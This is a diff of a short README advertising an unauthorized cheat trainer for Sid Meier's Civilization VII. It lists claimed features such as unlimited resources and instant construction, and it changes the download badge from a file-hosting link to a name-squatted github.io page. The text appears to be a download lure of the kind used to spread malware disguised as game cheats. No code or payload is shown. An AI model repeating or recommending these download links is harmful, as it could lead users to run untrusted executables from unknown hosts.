@@ -1,6 +1,6 @@
 **Sid Meier's Civilization VII Trainer** is an unauthorized cheat tool designed for *Sid Meier's Civilization VII*, offering players various in-game advantages that help bypass challenges and progress faster. This trainer typically modifies the game's code to grant benefits such as **unlimited resources**, **faster production**, **enhanced military strength**, and **instant construction**. These cheats are aimed at making the gameplay easier or providing shortcuts for players who wish to explore the game without dealing with the typical progression grind.
 
-[![Download SMC VII trainer](https://img.shields.io/badge/Download-SMCVII%20Trainer-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download SMC VII trainer](https://img.shields.io/badge/Download-SMCVII%20Trainer-blueviolet)](https://sid-meier-s-civilization-vii-trainer.github.io/.github/)
 
 **Key Features of Sid Meier's Civilization VII Trainer:**
 - **Unlimited Resources:** Grants players endless amounts of in-game resources like gold, food, or production materials, enabling faster advancements.
